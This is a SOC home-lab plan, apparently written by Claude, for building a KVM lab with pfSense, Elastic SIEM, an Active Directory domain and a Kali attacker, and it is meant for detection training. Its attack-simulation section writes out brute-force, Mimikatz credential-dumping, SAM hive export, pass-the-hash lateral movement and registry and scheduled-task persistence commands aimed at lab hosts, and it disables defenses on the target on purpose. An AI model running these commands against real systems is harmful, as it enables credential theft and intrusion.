# SOC Lab Plan - Claude (Optimized)

## Executive Summary

This is an optimized SOC lab implementation plan for your Dell XPS 9320 with 16 GB RAM running Ubuntu. This plan improves upon the baseline by adding phased deployment, resource optimization strategies, snapshot management, and comprehensive attack simulation scenarios.

**Strategic Windows Delay:** Windows ISOs have time-limited evaluation licenses (180 days for Server, 90 days for Win10/11). This plan delays Windows downloads and deployment until Phase 5, allowing you to build and validate your core infrastructure (hypervisor, networking, SIEM, attack platform) first. This maximizes your Windows evaluation period and reduces pressure during the learning process.

## System Analysis

### Verified Hardware Capabilities
- **CPU:** 16 logical cores (Intel 12th/13th gen with VT-x)
- **RAM:** 16 GB (15.4 GB usable)
- **Virtualization:** KVM with VT-x hardware acceleration
- **Storage:** SSD recommended for VM performance

### Performance Considerations
Your system can comfortably handle this lab with the following optimizations:
- Run 3-4 VMs simultaneously (hot VMs)
- Suspend unused VMs to free RAM
- Use thin provisioning for disk space
- Leverage KVM's memory ballooning

## Lab Architecture Overview

### Network Topology
```
┌─────────────────────────────────────────────────────────────┐
│                        Internet                              │
└───────────────────────┬─────────────────────────────────────┘
                        │
                    [virbr0/NAT]
                        │
┌───────────────────────▼──────────────────────────────────────┐
│                 pfSense Firewall                             │
│  WAN: virbr0 (NAT)  │  LAN: socnet (10.10.10.1)            │
└─────────────────────┬────────────────────────────────────────┘
                      │
                [socnet: 10.10.10.0/24]
                      │
        ┌─────────────┼─────────────┬─────────────┐
        │             │             │             │
   ┌────▼────┐   ┌───▼────┐   ┌───▼─────┐  ┌───▼────┐
   │ Elastic │   │Windows │   │ Windows │  │  Kali  │
   │  SIEM   │   │   DC   │   │ Client  │  │ Attack │
   │.10      │   │.20     │   │.30      │  │.40     │
   └─────────┘   └────────┘   └─────────┘  └────────┘
```

### Data Flow
```
Attack (Kali) → Target (Win Client) → Logs → Elastic SIEM
                     ↓
              Windows DC (AD)
                     ↓
              Authentication Logs → Elastic
                     ↓
              pfSense (Firewall) → Network Logs → Elastic
```

## VM Specifications (Optimized)

### Resource Allocation Strategy

| VM | vCPU | RAM (GB) | Disk (GB) | Priority | Notes |
|---|------|----------|-----------|----------|-------|
| pfSense | 1 | 1 | 10 | Medium | Can suspend during analysis |
| Elastic Server | 4 | 5 | 60 | HIGH | Core SIEM - always running |
| Windows DC | 2 | 3 | 50 | HIGH | Active Directory services |
| Windows Client | 2 | 3 | 40 | HIGH | Primary attack target |
| Kali Linux | 2 | 2 | 30 | LOW | Suspend when not attacking |
| **TOTAL** | **11** | **14 GB** | **190 GB** | | Leaves 2 GB for host |

### VM Detailed Configurations

#### 1. pfSense Firewall (Gateway & IDS)
**Purpose:** Network security, traffic inspection, IDS/IPS logs

**Specs:**
- vCPU: 1 (host-passthrough)
- RAM: 1 GB
- Disk: 10 GB (virtio, thin provisioned)
- NIC1: virbr0 (NAT/WAN) - Internet access
- NIC2: socnet (Internal/LAN) - Lab network
- IP: 10.10.10.1/24

**Software Configuration:**
- pfSense CE 2.7.x
- Suricata IDS/IPS with ET Open ruleset
- pfBlockerNG for threat intelligence feeds
- Logging: All firewall rules, IDS alerts, DNS queries

**Why This Matters:**
- Provides realistic network security layer
- Generates firewall logs for SIEM correlation
- IDS alerts for attack detection training
- Network segmentation practice

#### 2. Ubuntu Elastic Server (Core SIEM)
**Purpose:** Centralized log collection, analysis, visualization

**Specs:**
- vCPU: 4 (host-passthrough)
- RAM: 5 GB (4 GB minimum, 5 GB optimal)
- Disk: 60 GB (virtio, SSD strongly recommended)
- NIC: socnet (10.10.10.10/24)
- OS: Ubuntu Server 22.04 LTS (minimal install)

**Software Stack:**
- Elasticsearch 8.x (SIEM backend)
- Kibana 8.x (Dashboard & visualization)
- Elastic Fleet Server (Agent management)
- Logstash (optional - for complex log parsing)

**Data Sources:**
- Windows Event Logs (Security, System, Application)
- Sysmon logs (detailed process monitoring)
- pfSense firewall & Suricata IDS logs
- Active Directory authentication logs
- PowerShell script block logging

**Elastic Agent Deployment:**
- Windows DC: Elastic Agent + Sysmon
- Windows Client: Elastic Agent + Sysmon
- pfSense: Syslog forwarding to Logstash

**Optimizations:**
- Use Elastic Agent instead of Beats (unified management)
- Enable index lifecycle management (ILM) for log rotation
- Set data retention to 7-14 days (saves disk space)
- Use fleet policies for centralized agent configuration

#### 3. Windows Server 2022 (Domain Controller)
**Purpose:** Active Directory, DNS, centralized authentication

**Specs:**
- vCPU: 2
- RAM: 3 GB
- Disk: 50 GB (virtio)
- NIC: socnet (10.10.10.20/24)
- OS: Windows Server 2022 Evaluation

**Services & Roles:**
- Active Directory Domain Services (AD DS)
- DNS Server
- Group Policy Management
- Windows Event Forwarding (WEF)

**Security Configuration:**
- Domain: `soclab.local`
- Forest functional level: Windows Server 2016+
- Sysmon installed with SwiftOnSecurity config
- PowerShell logging enabled
- Enhanced auditing (logon events, object access, policy changes)

**User Accounts:**
- Domain Admin: `administrator@soclab.local`
- Standard User: `jdoe@soclab.local`
- Service Account: `svc_elastic@soclab.local`

**Why This Matters:**
- Realistic enterprise authentication environment
- Practice detecting credential attacks (Kerberoasting, Pass-the-Hash)
- Group Policy attack scenarios
- Lateral movement detection

#### 4. Windows 10/11 Client (Attack Target)
**Purpose:** Simulated victim workstation, attack target

**Specs:**
- vCPU: 2
- RAM: 3 GB
- Disk: 40 GB (virtio)
- NIC: socnet (10.10.10.30/24)
- OS: Windows 10/11 Pro Evaluation

**Configuration:**
- Domain joined to `soclab.local`
- Logged in as `jdoe@soclab.local`
- Sysmon installed (SwiftOnSecurity config)
- Elastic Agent with full monitoring
- Microsoft Defender enabled (for testing bypasses)

**Intentional Vulnerabilities:**
- SMBv1 enabled (for EternalBlue simulation)
- Weak user password (for brute force detection)
- Office macros enabled (for phishing simulation)
- RDP enabled (for lateral movement)

**Monitoring:**
- Process creation (Sysmon Event ID 1)
- Network connections (Sysmon Event ID 3)
- File creation (Sysmon Event ID 11)
- Registry modifications (Sysmon Event ID 12-14)
- PowerShell execution (Script Block Logging)

#### 5. Kali Linux (Attack Platform)
**Purpose:** Penetration testing, attack simulation

**Specs:**
- vCPU: 2
- RAM: 2 GB
- Disk: 30 GB (thin provisioned)
- NIC: socnet (10.10.10.40/24)
- OS: Kali Linux 2024.x

**Pre-installed Tools:**
- Reconnaissance: Nmap, enum4linux, BloodHound
- Exploitation: Metasploit, exploit-db
- Password Attacks: Hydra, John the Ripper, Hashcat
- Post-Exploitation: Mimikatz, PowerSploit, Empire
- AD Attacks: Impacket suite, Responder, CrackMapExec
- C2 Frameworks: Sliver, Covenant (optional)

**Attack Scenarios:**
1. Network reconnaissance
2. SMB relay attacks
3. Kerberoasting
4. Pass-the-Hash
5. Mimikatz credential dumping
6. Lateral movement
7. Ransomware simulation
8. Command & Control (C2) beaconing

## Phased Implementation Plan

### Phase 1: Foundation (Week 1)
**Goal:** Get hypervisor and networking working

1. Install KVM stack
2. Create virtual networks
3. Deploy pfSense firewall
4. Test internet connectivity
5. Verify internal network isolation

**Validation:**
- VMs can reach internet through pfSense
- Internal network is isolated
- pfSense web UI accessible

### Phase 2: SIEM Deployment (Week 2)
**Goal:** Get Elastic Stack operational

1. Deploy Ubuntu Server VM
2. Install Elasticsearch + Kibana
3. Configure Fleet Server
4. Set up data retention policies
5. Create basic dashboards

**Validation:**
- Kibana web UI accessible
- Fleet Server running
- Test log ingestion with sample data

### Phase 3: Attack Platform (Week 3)
**Goal:** Deploy Kali and validate infrastructure

1. Deploy Kali Linux VM
2. Update all tools
3. Test network connectivity
4. Run basic reconnaissance against pfSense
5. Verify network segmentation

**Validation:**
- Kali has internet access through pfSense
- Can reach all socnet IPs
- Basic port scans visible in pfSense logs
- Logs forwarding to Elastic (if configured)

**Why Now:** Validates your entire infrastructure (hypervisor, networks, SIEM) before Windows evaluation clock starts ticking

### Phase 4: Infrastructure Validation (Week 4)
**Goal:** Test and optimize core infrastructure

1. Run extended Elastic log ingestion tests
2. Configure pfSense log forwarding to Elastic
3. Set up Suricata IDS on pfSense
4. Create basic detection dashboards
5. Document baseline performance metrics

**Validation:**
- Elastic handling log volume well
- pfSense logs visible in Kibana
- IDS alerts triggering correctly
- System stable with 3 VMs running

**Why Now:** Ensures solid foundation and gives you time to troubleshoot before adding Windows complexity

### Phase 5: Windows Infrastructure (Week 5+)
**Goal:** Build Active Directory environment

**IMPORTANT:** Download Windows ISOs just before starting this phase to maximize evaluation period
- Windows Server 2022: 180-day evaluation
- Windows 10/11: 90-day evaluation

**Steps:**
1. Download Windows Server 2022 Evaluation ISO
2. Deploy Windows Server VM
3. Promote to Domain Controller
4. Configure AD DS and DNS
5. Create user accounts and OUs
6. Install Sysmon and Elastic Agent

**Validation:**
- Domain services functional
- DNS resolving correctly
- Logs flowing to Elastic
- Authentication working

### Phase 6: Endpoints & Attack Simulation (Week 6+)
**Goal:** Deploy monitored endpoints and run attack scenarios

**Steps:**
1. Download Windows 10/11 Evaluation ISO (if not already done)
2. Deploy Windows client VM
3. Join to domain
4. Install Sysmon with production config
5. Deploy Elastic Agent
6. Run full attack simulation scenarios

**Validation:**
- Authentication working
- Process creation logs visible
- Network activity monitored
- PowerShell logging functional
- Attack scenarios generating detectable alerts

## Installation Commands & Scripts

### Step 1: Install KVM on Ubuntu
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install KVM and tools
sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients \
  bridge-utils virt-manager virtinst cpu-checker

# Verify virtualization support
kvm-ok
# Expected: "KVM acceleration can be used"

# Add your user to libvirt groups
sudo usermod -aG libvirt,kvm $USER

# Enable and start libvirtd
sudo systemctl enable --now libvirtd

# Verify KVM modules loaded
lsmod | grep kvm
# Expected: kvm_intel or kvm_amd

# Check libvirt is running
sudo systemctl status libvirtd
```

### Step 2: Create Virtual Networks
```bash
# Verify default NAT network exists
sudo virsh net-list --all
# Expected: default network (active)

# If default network is inactive
sudo virsh net-start default
sudo virsh net-autostart default

# Create isolated SOC lab network
cat > socnet.xml << 'EOF'
<network>
  <name>socnet</name>
  <forward mode='nat'>
    <nat>
      <port start='1024' end='65535'/>
    </nat>
  </forward>
  <bridge name='virbr1' stp='on' delay='0'/>
  <ip address='10.10.10.1' netmask='255.255.255.0'>
    <dhcp>
      <range start='10.10.10.100' end='10.10.10.200'/>
      <host mac='52:54:00:01:00:10' name='elastic' ip='10.10.10.10'/>
      <host mac='52:54:00:01:00:20' name='dc' ip='10.10.10.20'/>
      <host mac='52:54:00:01:00:30' name='client' ip='10.10.10.30'/>
      <host mac='52:54:00:01:00:40' name='kali' ip='10.10.10.40'/>
    </dhcp>
  </ip>
</network>
EOF

# Define and start the network
sudo virsh net-define socnet.xml
sudo virsh net-start socnet
sudo virsh net-autostart socnet

# Verify networks
sudo virsh net-list
```

### Step 3: Download Required ISOs

**Download Now (Phase 1-4):**
```bash
# Create ISO directory
mkdir -p ~/ISOs
cd ~/ISOs

# Download pfSense (example - verify current version)
wget https://atxfiles.netgate.com/mirror/downloads/pfSense-CE-2.7.2-RELEASE-amd64.iso.gz
gunzip pfSense-CE-2.7.2-RELEASE-amd64.iso.gz

# Download Ubuntu Server
wget https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso

# Download Kali Linux
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso
```

**Download Later (Just Before Phase 5):**

Windows evaluation ISOs have time-limited licenses. Download these ONLY when you're ready to build the Windows infrastructure:

- **Windows Server 2022 Evaluation:** 180-day license
- **Windows 10/11 Enterprise Evaluation:** 90-day license

Download from: https://www.microsoft.com/en-us/evalcenter/

**Why Wait?**
- Maximizes your evaluation period
- Ensures you have a stable, tested infrastructure first
- You'll also have Windows VMs available when you spin up AWS cloud network
- Reduces pressure to rush through Windows configuration

### Step 4: Create pfSense VM
```bash
# Create pfSense VM using virt-install
sudo virt-install \
  --name pfsense \
  --ram 1024 \
  --vcpus 1 \
  --cpu host-passthrough \
  --disk path=/var/lib/libvirt/images/pfsense.qcow2,size=10,format=qcow2,bus=virtio \
  --network network=default,model=virtio \
  --network network=socnet,model=virtio \
  --graphics vnc,listen=127.0.0.1 \
  --cdrom ~/ISOs/pfSense-CE-2.7.2-RELEASE-amd64.iso \
  --os-variant freebsd13.0 \
  --boot uefi
```

### Step 5: Create Elastic Server VM
```bash
# Create Ubuntu VM for Elastic Stack
sudo virt-install \
  --name elastic \
  --ram 5120 \
  --vcpus 4 \
  --cpu host-passthrough \
  --disk path=/var/lib/libvirt/images/elastic.qcow2,size=60,format=qcow2,bus=virtio \
  --network network=socnet,model=virtio,mac=52:54:00:01:00:10 \
  --graphics vnc,listen=127.0.0.1 \
  --cdrom ~/ISOs/ubuntu-22.04.3-live-server-amd64.iso \
  --os-variant ubuntu22.04 \
  --boot uefi

# After Ubuntu installation, install Elastic Stack
# (See Elastic installation script below)
```

### Step 6: Create Windows Server DC
```bash
# Create Windows Server VM
sudo virt-install \
  --name windows-dc \
  --ram 3072 \
  --vcpus 2 \
  --disk path=/var/lib/libvirt/images/windows-dc.qcow2,size=50,format=qcow2,bus=virtio \
  --network network=socnet,model=virtio,mac=52:54:00:01:00:20 \
  --graphics vnc,listen=127.0.0.1 \
  --cdrom ~/ISOs/WindowsServer2022.iso \
  --os-variant win2k22 \
  --boot uefi

# Note: You'll need Windows VirtIO drivers for network/disk
# Download from: https://github.com/virtio-win/virtio-win-pkg-scripts/blob/master/README.md
```

### Step 7: Create Windows 10/11 Client
```bash
# Create Windows Client VM
sudo virt-install \
  --name windows-client \
  --ram 3072 \
  --vcpus 2 \
  --disk path=/var/lib/libvirt/images/windows-client.qcow2,size=40,format=qcow2,bus=virtio \
  --network network=socnet,model=virtio,mac=52:54:00:01:00:30 \
  --graphics vnc,listen=127.0.0.1 \
  --cdrom ~/ISOs/Windows10.iso \
  --os-variant win10 \
  --boot uefi
```

### Step 8: Create Kali Linux VM
```bash
# Create Kali VM
sudo virt-install \
  --name kali \
  --ram 2048 \
  --vcpus 2 \
  --cpu host-passthrough \
  --disk path=/var/lib/libvirt/images/kali.qcow2,size=30,format=qcow2,bus=virtio \
  --network network=socnet,model=virtio,mac=52:54:00:01:00:40 \
  --graphics vnc,listen=127.0.0.1 \
  --cdrom ~/ISOs/kali-linux-2024.1-installer-amd64.iso \
  --os-variant debian11 \
  --boot uefi
```

## Elastic Stack Installation Script

SSH into the Elastic Ubuntu server and run:

```bash
#!/bin/bash
# Elastic Stack Installation for Ubuntu 22.04

# Set version
ELASTIC_VERSION="8.11.3"

# Update system
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y apt-transport-https wget gnupg

# Add Elastic GPG key and repository
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list

# Update apt cache
sudo apt update

# Install Elasticsearch
sudo apt install -y elasticsearch

# Configure Elasticsearch
sudo sed -i 's/#network.host: 192.168.0.1/network.host: 0.0.0.0/' /etc/elasticsearch/elasticsearch.yml
sudo sed -i 's/#http.port: 9200/http.port: 9200/' /etc/elasticsearch/elasticsearch.yml

# Start Elasticsearch
sudo systemctl enable elasticsearch
sudo systemctl start elasticsearch

# Wait for Elasticsearch to start
sleep 30

# Install Kibana
sudo apt install -y kibana

# Configure Kibana
sudo sed -i 's/#server.host: "localhost"/server.host: "0.0.0.0"/' /etc/kibana/kibana.yml
echo 'server.publicBaseUrl: "http://10.10.10.10:5601"' | sudo tee -a /etc/kibana/kibana.yml

# Start Kibana
sudo systemctl enable kibana
sudo systemctl start kibana

# Install Fleet Server
sudo apt install -y elastic-agent

echo "Elastic Stack installation complete!"
echo "Access Kibana at: http://10.10.10.10:5601"
echo "Default credentials saved in: /etc/elasticsearch/elasticsearch.yml"
```

## Sysmon Installation (Windows)

### SwiftOnSecurity Sysmon Configuration
```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
Expand-Archive -Path "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\Sysmon"

# Download SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$env:TEMP\sysmonconfig.xml"

# Install Sysmon with config
& "$env:TEMP\Sysmon\Sysmon64.exe" -accepteula -i "$env:TEMP\sysmonconfig.xml"

# Verify installation
Get-Service Sysmon64
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```

## Attack Simulation Scenarios

### Scenario 1: Network Reconnaissance
**Objective:** Detect network scanning activity

**Attack Steps (Kali):**
```bash
# Host discovery
sudo nmap -sn 10.10.10.0/24

# Port scanning
sudo nmap -sS -p- 10.10.10.30

# Service enumeration
sudo nmap -sV -sC 10.10.10.30

# SMB enumeration
enum4linux -a 10.10.10.30
```

**Expected Detections:**
- Multiple connection attempts from single source
- Sequential port scanning pattern
- SMB enumeration attempts
- Elastic SIEM alert: "Network Scan Detected"

### Scenario 2: Brute Force Attack
**Objective:** Detect authentication attacks

**Attack Steps (Kali):**
```bash
# RDP brute force
hydra -l jdoe -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.30

# SMB brute force
crackmapexec smb 10.10.10.30 -u jdoe -p /usr/share/wordlists/passwords.txt
```

**Expected Detections:**
- Multiple failed authentication attempts
- Windows Event ID 4625 (Failed logon)
- Elastic SIEM alert: "Brute Force Attack Detected"
- Account lockout events

### Scenario 3: Credential Dumping
**Objective:** Detect credential access

**Attack Steps (on compromised Windows Client):**
```powershell
# Mimikatz credential dump (run as admin)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Export SAM database
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

**Expected Detections:**
- Sysmon Event ID 10 (Process Access) - LSASS memory read
- Sensitive file access (SAM, SYSTEM)
- Mimikatz process execution
- Elastic alert: "Credential Dumping Activity"

### Scenario 4: Lateral Movement
**Objective:** Detect movement between systems

**Attack Steps (Kali):**
```bash
# Pass-the-Hash with captured credentials
impacket-psexec 'soclab.local/jdoe@10.10.10.20' -hashes :ntlmhash

# WMI lateral movement
impacket-wmiexec 'soclab.local/jdoe@10.10.10.20' -hashes :ntlmhash
```

**Expected Detections:**
- New logon from unusual source
- Windows Event ID 4624 (Successful logon) - Type 3 (Network)
- New service creation
- Remote WMI execution
- Elastic alert: "Lateral Movement Detected"

### Scenario 5: Persistence Mechanism
**Objective:** Detect persistence techniques

**Attack Steps (on compromised system):**
```powershell
# Registry Run key persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\malware.exe"

# Scheduled task persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\malware.exe" /sc onlogon
```

**Expected Detections:**
- Sysmon Event ID 13 (Registry modification) - Run key
- Scheduled task creation
- Autostart entry modification
- Elastic alert: "Persistence Mechanism Detected"

## Resource Management & Optimization

### VM Lifecycle Commands
```bash
# Start all VMs
sudo virsh start pfsense
sudo virsh start elastic
sudo virsh start windows-dc
sudo virsh start windows-client
sudo virsh start kali

# Suspend VMs to save RAM
sudo virsh suspend kali
sudo virsh suspend pfsense

# Resume VMs
sudo virsh resume kali

# Stop VMs gracefully
sudo virsh shutdown windows-client

# Force stop (if needed)
sudo virsh destroy windows-client

# List running VMs
sudo virsh list

# Check VM resource usage
sudo virsh dominfo windows-client
```

### Snapshot Management
```bash
# Create snapshot before attack simulation
sudo virsh snapshot-create-as windows-client --name "pre-attack-clean" --description "Clean state before attack"

# List snapshots
sudo virsh snapshot-list windows-client

# Revert to snapshot (for repeatable testing)
sudo virsh snapshot-revert windows-client "pre-attack-clean"

# Delete snapshot
sudo virsh snapshot-delete windows-client "pre-attack-clean"
```

### Performance Monitoring
```bash
# Monitor host RAM usage
free -h

# Monitor VM CPU usage
virt-top

# Check disk I/O
sudo iotop

# Monitor network traffic
sudo iftop -i virbr1
```

## Troubleshooting Guide

### Issue: VMs not getting IP addresses
```bash
# Check DHCP service
sudo virsh net-dhcp-leases socnet

# Restart network
sudo virsh net-destroy socnet
sudo virsh net-start socnet

# Verify network active
sudo virsh net-list
```

### Issue: Can't connect to Elastic/Kibana
```bash
# SSH to Elastic server
ssh user@10.10.10.10

# Check Elasticsearch
sudo systemctl status elasticsearch
sudo journalctl -u elasticsearch -f

# Check Kibana
sudo systemctl status kibana
sudo journalctl -u kibana -f

# Verify listening ports
sudo netstat -tlnp | grep -E '9200|5601'
```

### Issue: Windows won't join domain
```powershell
# Set DNS to DC
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.20

# Test DNS resolution
nslookup soclab.local 10.10.10.20

# Verify connectivity
Test-NetConnection -ComputerName 10.10.10.20 -Port 389

# Join domain manually
Add-Computer -DomainName soclab.local -Credential soclab\administrator -Restart
```

### Issue: Out of RAM
```bash
# Check what's using memory
free -h
sudo virsh list
sudo virsh dominfo <vm-name>

# Suspend unused VMs
sudo virsh suspend kali
sudo virsh suspend pfsense

# Reduce VM RAM (requires shutdown)
sudo virsh shutdown windows-client
sudo virsh setmaxmem windows-client 2G --config
sudo virsh setmem windows-client 2G --config
sudo virsh start windows-client
```

## Security Considerations

### Lab Isolation
- Keep lab network isolated from production
- Use NAT instead of bridged networking
- Don't expose VMs to internet directly
- Use pfSense as security gateway

### Malware Handling
- NEVER use real malware without proper containment
- Use Metasploit payloads for safe testing
- Take snapshots before running unknown code
- Keep VMs isolated during testing

### Credential Management
- Use unique passwords for lab only
- Don't reuse production credentials
- Document all credentials securely
- Reset/destroy VMs periodically

## Learning Objectives & Skills Developed

### Blue Team Skills
1. SIEM deployment and configuration
2. Log analysis and correlation
3. Threat detection rule creation
4. Incident investigation workflows
5. Network traffic analysis
6. Windows event log interpretation
7. Endpoint detection strategies

### Red Team Skills
1. Network reconnaissance
2. Vulnerability assessment
3. Exploitation techniques
4. Post-exploitation
5. Lateral movement
6. Credential harvesting
7. Persistence mechanisms

### Purple Team Integration
1. Attack simulation
2. Detection engineering
3. Validation testing
4. Coverage gap analysis
5. Control effectiveness measurement

## Next Steps & Expansion

### Advanced Additions
1. **Threat Intel Integration**
   - MISP threat intelligence platform
   - OpenCTI integration with Elastic

2. **Additional SIEM Tools**
   - Wazuh for host-based detection
   - Velociraptor for endpoint visibility

3. **Advanced Monitoring**
   - Zeek (formerly Bro) for network analysis
   - Suricata IDS/IPS integration

4. **Malware Analysis**
   - REMnux for malware analysis
   - Cuckoo Sandbox for automated analysis

5. **Cloud Integration**
   - AWS/Azure logging simulation
   - Cloud-native attack scenarios

## Conclusion

This lab provides a complete, enterprise-realistic SOC environment for hands-on learning. Follow the phased approach, validate each component, and systematically build your skills through the attack scenarios.

Key Success Factors:
- Take snapshots frequently
- Document all changes
- Run attack scenarios multiple times
- Tune detection rules based on results
- Build muscle memory for investigation workflows

Your 16 GB system is perfect for this lab. Start with Phase 1 and progress systematically. Each phase builds on the previous, creating a solid foundation for SOC analyst skills.
